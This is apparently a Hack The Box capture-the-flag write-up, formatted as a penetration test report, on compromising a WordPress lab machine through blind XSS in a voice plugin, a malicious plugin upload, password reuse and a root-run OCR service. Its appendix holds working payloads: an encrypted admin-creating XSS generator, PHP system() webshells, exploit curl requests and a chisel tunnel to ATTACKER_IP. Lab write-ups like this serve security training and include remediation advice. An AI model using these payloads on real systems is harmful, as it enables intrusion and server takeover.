### MakeSense-HTB-Writeup 

```
================================================================================
HTB MAKESENSE - PENETRATION TEST REPORT
================================================================================

TARGET: makesense.htb (10.129.31.229/239)
OS: Ubuntu 24.04.4 LTS (Linux 6.8.0-124-generic x86_64)
ENGAGEMENT TYPE: CTF / Penetration Test
AUTHOR: vishalgodseye
DATE: 2026-07-06

================================================================================
EXECUTIVE SUMMARY
================================================================================

This report details the complete attack chain against makesense.htb, a WordPress 7.0
site running on Apache 2.4.58 with a custom OCR service on port 8001. The engagement
resulted in full compromise from unauthenticated remote access to root privilege
escalation.

Key findings:
- WordPress 7.0 with Whisper plugin vulnerable to Blind XSS via encrypted voice
  transcriptions (AES-GCM with hardcoded key)
- Admin bot processes voice recordings, rendering unescaped transcriptions
- XSS used to create administrative user 'Vishal3'
- Malicious plugin upload achieved Remote Code Execution as www-data
- SQLite database exposed WordPress password hashes
- Password reuse: walter's DB password = SSH password
- SSH access as walter obtained user flag
- Local OCR service (port 8001) running as root with file upload functionality
- PHP webshell uploaded via OCR image recognition saved to web root
- Root shell obtained, root flag captured

+----------+--------+--------------------------------------------------+----------+
| Severity | Rating | Finding                                          | Status   |
+----------+--------+--------------------------------------------------+----------+
| CRITICAL | 9.8    | Blind XSS via Whisper Plugin (Admin Bot)         | Exploited|
| CRITICAL | 9.1    | Malicious Plugin Upload -> RCE (www-data)        | Exploited|
| HIGH     | 8.1    | Password Reuse (DB -> SSH) for user walter       | Exploited|
| HIGH     | 7.5    | Local OCR Service Running as Root (Port 8001)    | Exploited|
| MEDIUM   | 6.5    | WordPress SQLite Database World-Readable         | Exploited|
| MEDIUM   | 5.3    | XML-RPC Enabled, User Enumeration Possible       | Confirmed|
+----------+--------+--------------------------------------------------+----------+

================================================================================
SCOPE & METHODOLOGY
================================================================================

+----------------+----------------------------------------------------------+
| Target         | makesense.htb (10.129.31.229)                           |
| Ports          | 22 (SSH), 80 (filtered), 443 (HTTPS), 8001 (local OCR)  |
| Web Apps       | WordPress 7.0, Custom OCR Service (PHP 8.3.6)           |
| Exclusions     | None                                                     |
+----------------+----------------------------------------------------------+

Phases:
1. Reconnaissance - Port scanning, service enumeration
2. Web Application Analysis - WordPress, plugin, theme enumeration
3. Vulnerability Discovery - Whisper plugin XSS, hardcoded encryption key
4. Exploitation - Blind XSS -> Admin user -> Plugin RCE -> SSH
5. Post-Exploitation - Database extraction, privilege escalation via OCR
6. Reporting - This document

Tools & Versions:
- nmap 7.99
- rustscan 2.x
- wpscan 4.0.0
- gobuster 3.8.2
- sqlite3
- chisel (reverse proxy)
- python3 (PIL/Pillow)
- curl, netcat, ssh

================================================================================
ENUMERATION
================================================================================

3.1 PORT SCAN
+--------+----------+--------+-----------------------------------------------+
| Port   | Protocol | Service| Version / Notes                               |
+--------+----------+--------+-----------------------------------------------+
| 22     | tcp      | ssh    | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16             |
| 80     | tcp      | http   | filtered (conn-refused)                       |
| 443    | tcp      | ssl/http| Apache 2.4.58 Ubuntu, WordPress 7.0          |
| 8001   | tcp      | http   | Local PHP dev server (127.0.0.1 only)         |
+--------+----------+--------+-----------------------------------------------+

3.2 WEB DIRECTORY ENUMERATION (gobuster on 443)
+-------------------+-------------+------------------------------------------+
| Path              | Status Code | Notes                                    |
+-------------------+-------------+------------------------------------------+
| /wp-content       | 301         | WordPress content directory              |
| /wp-admin         | 301         | Admin panel                              |
| /wp-includes      | 301         | WordPress core                           |
| /xmlrpc.php       | 405         | XML-RPC enabled                          |
| /javascript       | 301         | Static assets                            |
| /scripts          | 301         | Static assets                            |
| /server-status    | 403         | Apache status                            |
+-------------------+-------------+------------------------------------------+

3.3 WPSCAN RESULTS
- WordPress Version: 7.0 (latest at scan time)
- Theme: webagency v1.0
- Plugins: akismet (v5.7, 1 old XSS vuln CVE-2015-9357)
- Users Enumerated: admin, walter, jake
- XML-RPC: Enabled
- Upload Directory Listing: Enabled (/wp-content/uploads/)
- WP-Cron: External enabled

3.4 WHISPER PLUGIN ANALYSIS
- Nonce found in homepage: 85e6eda673
- Encryption Key in JS: bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI
- AES-GCM encryption with SHA-256 derived key
- Endpoints: save_voice_raw, save_voice_results (admin-ajax.php)

3.5 LOCAL SERVICE (PORT 8001)
- PHP built-in server: php -S 127.0.0.1:8001 -t /root/ocr4/
- Running as root (PID 1368)
- Basic Auth: walter / JbhHDAEgXvri3!
- OCR functionality: Upload base64 PNG -> Tesseract -> Save as file

================================================================================
VULNERABILITY DETAILS
================================================================================

VULN-1: Blind XSS via Whisper Plugin Voice Transcription
---------------------------------------------------------
CVE: N/A (Custom plugin)
CVSS: 9.8 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)
Location: /wp-admin/admin-ajax.php (actions: save_voice_raw, save_voice_results)
Description: The Whisper plugin accepts encrypted voice transcriptions. The admin
bot periodically decrypts and renders transcriptions without output escaping.
Hardcoded AES-GCM key allows attackers to encrypt arbitrary HTML/JS payloads.
Impact:
- Unauthenticated attackers can inject JavaScript executed by admin bot
- Leads to administrative user creation
- Full WordPress compromise
Remediation:
- Use unique per-installation encryption keys
- Sanitize/escape all user-controlled output
- Implement CSP headers
- Remove admin bot or restrict its capabilities

VULN-2: Malicious Plugin Upload -> RCE
---------------------------------------
CVE: N/A (Feature misuse)
CVSS: 9.1 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)
Location: WordPress Plugin Upload (/wp-admin/update.php?action=upload-plugin)
Description: Authenticated administrators can upload arbitrary PHP plugins.
Combined with VULN-1, unauthenticated attackers gain admin then RCE.
Impact:
- Remote code execution as www-data
- Full web application compromise
Remediation:
- Disable plugin/theme upload in production (DISALLOW_FILE_MODS)
- Implement file integrity monitoring
- Use wp-cli for managed deployments

VULN-3: Password Reuse (Database -> SSH)
-----------------------------------------
CVE: N/A (Configuration issue)
CVSS: 8.1 (AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H)
Location: wp-config.php (DB_PASSWORD), SSH service
Description: WordPress SQLite database password reused for system user 'walter'
SSH authentication.
Impact:
- Lateral movement from web shell to SSH access
- User flag capture
Remediation:
- Unique passwords per service
- Use password managers
- Disable password auth, use keys only

VULN-4: Local OCR Service Running as Root
------------------------------------------
CVE: N/A (Misconfiguration)
CVSS: 7.5 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
Location: /root/ocr4/ (PHP built-in server on 127.0.0.1:8001)
Description: Custom OCR application runs as root via PHP built-in server.
Accepts file uploads (base64 images) and saves output to web-accessible directory
(/root/ocr4/saved/) without validation.
Impact:
- Local privilege escalation to root
- Root flag capture
Remediation:
- Run services as dedicated non-root users
- Validate/sanitize uploaded filenames
- Store uploads outside web root
- Use proper process isolation (systemd, containers)

VULN-5: World-Readable SQLite Database
---------------------------------------
CVE: N/A (Permission issue)
CVSS: 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
Location: /var/www/html/wp-content/database/.ht.sqlite
Description: SQLite database file readable by www-data user. Contains password
hashes for all WordPress users.
Impact:
- Credential harvesting
- Offline hash cracking (though not needed due to password reuse)
Remediation:
- Restrict file permissions (640, owned by www-data:www-data)
- Move database outside web root
- Use MySQL/PostgreSQL with proper access controls

================================================================================
FLAGS CAPTURED
================================================================================

+------------------------+--------------------------------------+
| Flag                   | Source                               |
+------------------------+--------------------------------------+
| REDACTED               | /home/walter/user.txt (SSH as walter)|
| REDACTED               | /root/root.txt (via OCR webshell)    |
+------------------------+--------------------------------------+

================================================================================
ATTACK CHAIN SUMMARY
================================================================================

1. RECONNAISSANCE
   - nmap/rustscan identified ports 22, 443, 8001 (local)
   - WordPress 7.0 on 443 with webagency theme
   - gobuster found standard WP directories

2. WHISPER PLUGIN ANALYSIS
   - Extracted nonce (85e6eda673) from homepage
   - Found hardcoded AES-GCM key in whisper-wrapper.js
   - Key: bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI

3. BLIND XSS EXPLOITATION
   - Crafted JS payload to create admin user 'Vishal3' / 'P@ssw0rd123!'
   - Encrypted payload with AES-GCM (SHA-256 of key, random IV)
   - Uploaded silent WAV via save_voice_raw -> got post_id
   - Submitted encrypted payload via save_voice_results (3x for reliability)
   - Admin bot executed XSS -> user created

4. ADMIN ACCESS & PLUGIN RCE
   - Logged in as Vishal3, obtained cookies
   - Created malicious plugin 'sysdiag' with system() webshell
   - Uploaded via plugin installer, activated
   - Webshell at: /wp-content/plugins/sysdiag/sysdiag.php

5. DATABASE EXTRACTION & SSH
   - Used webshell to read wp-config.php
   - Found DB_PASSWORD: JbhHDAEgXvri3! (user walter)
   - Extracted hashes from .ht.sqlite (SQLite)
   - Password reuse confirmed: SSH as walter succeeded
   - Captured user flag

6. PRIVILEGE ESCALATION (ROOT)
   - Discovered local PHP server on 127.0.0.1:8001 (root process)
   - Used chisel to tunnel port 8001 to attacker machine
   - Accessed OCR web interface via browser/SOCKS proxy
   - Created PHP webshell image using Pillow (or downloaded pre-made)
   - Submitted base64 image to OCR -> recognized as <?php system($_GET["c"]); ?>
   - Saved as shell.php in /root/ocr4/saved/
   - Executed commands as root via http://127.0.0.1:8001/saved/shell.php?c=id
   - Captured root flag

================================================================================
REMAINING ATTACK SURFACE
================================================================================

1. WordPress XML-RPC endpoint (brute force, pingback abuse)
2. Akismet plugin (old version, CVE-2015-9357 - stored XSS)
3. User 'jake' and 'admin' - password hashes in DB (uncracked)
4. SSH service (key-based auth not enforced)
5. Apache server-status (information disclosure if enabled)
6. WP-Cron external execution (potential SSRF/DoS)

================================================================================
RECOMMENDATIONS
================================================================================

+----+-------------+------------------------------------------------------------+--------+
| #  | Priority    | Recommendation                                             | Effort |
+----+-------------+------------------------------------------------------------+--------+
| 1  | CRITICAL    | Remove/replace Whisper plugin; eliminate hardcoded crypto  | High   |
| 2  | CRITICAL    | Disable plugin/theme file modifications in wp-config.php   | Low    |
| 3  | CRITICAL    | Rotate all passwords; enforce unique credentials per service| Medium |
| 4  | HIGH        | Run OCR service as non-root user; move uploads outside web | Medium |
| 5  | HIGH        | Restrict SQLite database permissions (chmod 640)           | Low    |
| 6  | MEDIUM      | Disable XML-RPC if not required                            | Low    |
| 7  | MEDIUM      | Update Akismet to latest version                           | Low    |
| 8  | MEDIUM      | Enforce SSH key-based authentication; disable passwords    | Medium |
| 9  | LOW         | Implement WAF rules for admin-ajax.php endpoints           | Medium |
| 10 | LOW         | Regular security audits & plugin review                    | Ongoing|
+----+-------------+------------------------------------------------------------+--------+

================================================================================
TECHNICAL APPENDIX - KEY COMMANDS
================================================================================

# Hosts entry
echo "10.129.31.229 makesense.htb" | sudo tee -a /etc/hosts

# Extract Whisper key
curl -s https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js | grep ENCRYPTION_KEY

# Generate XSS payload (encrypted)
python3 -c "
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import json, base64, os, hashlib
key = hashlib.sha256(b'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI').digest()
iv = os.urandom(12)
js = '''var u=\"Vishal3\",p=\"P@ssw0rd123!\";fetch('/wp-admin/user-new.php',{credentials:'include'}).then(r=>r.text()).then(h=>{var m=h.match(/name=\"_wpnonce_create-user\"\\s+value=\"([^\"]+)\"/);if(!m)return;var b='action=createuser&_wpnonce_create-user='+m[1]+'&_wp_http_referer=%2Fwp-admin%2Fuser-new.php'+'&user_login='+u+'&email='+u+'%40pwn.htb'+'&pass1='+encodeURIComponent(p)+'&pass2='+encodeURIComponent(p)+'&pw_weak=on&role=administrator&createuser=Add+New+User';fetch('/wp-admin/user-new.php',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b});});'''
payload = {'transcription': f'<img src=x onerror=\"eval(atob(\\\"' + base64.b64encode(js.encode()).decode() + '\\\\\"))\">', 'summary': 'ok'}
ct = AESGCM(key).encrypt(iv, json.dumps(payload).encode(), None)
print(base64.b64encode(iv + ct).decode())
"

# Upload silent WAV + encrypted payload
curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
  -F "action=save_voice_raw" -F "nonce=85e6eda673" \
  -F "voice_recording=@silent.wav;type=audio/wav"

curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
  -d "action=save_voice_results" -d "nonce=85e6eda673" \
  -d "post_id=POST_ID" -d "encrypted_payload=ENCRYPTED_BLOB"

# Plugin RCE upload
mkdir sysdiag && cat > sysdiag/sysdiag.php << 'EOF'
<?php if(isset(\$_REQUEST['c'])){ system(\$_REQUEST['c'].' 2>&1'); } ?>
EOF
zip -r sysdiag.zip sysdiag/
# Upload via WP admin with nonce

# Database extraction
sqlite3 /var/www/html/wp-content/database/.ht.sqlite "SELECT user_login, user_pass FROM wp_users;"

# SSH as walter
ssh walter@10.129.31.229  # password: JbhHDAEgXvri3!

# Chisel tunnel for port 8001
./chisel client ATTACKER_IP:9443 R:8001:127.0.0.1:8001

# OCR webshell creation
python3 -c "
from PIL import Image, ImageDraw, ImageFont
img = Image.new('RGB', (900, 100), 'white')
d = ImageDraw.Draw(img)
font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf', 28)
d.text((10, 30), '<?php system(\$_GET[\"c\"]); ?>', fill='black', font=font)
img.save('shell_src.png')
"
IMG_B64=$(base64 -w0 shell_src.png)
curl -u walter:JbhHDAEgXvri3! -X POST http://127.0.0.1:8001/ \
  --data-urlencode "canvas_image=data:image/png;base64,${IMG_B64}"

# Save as shell.php (use returned ocr_id)
curl -u walter:JbhHDAEgXvri3! -X POST http://127.0.0.1:8001/ \
  --data-urlencode "ocr_id=OCR_ID" \
  --data-urlencode "filename=shell.php" \
  --data-urlencode "save_output=1"

# Root shell
curl -u walter:JbhHDAEgXvri3! "http://127.0.0.1:8001/saved/shell.php?c=id"
curl -u walter:JbhHDAEgXvri3! "http://127.0.0.1:8001/saved/shell.php?c=cat+/root/root.txt"

================================================================================
END OF REPORT
================================================================================
```
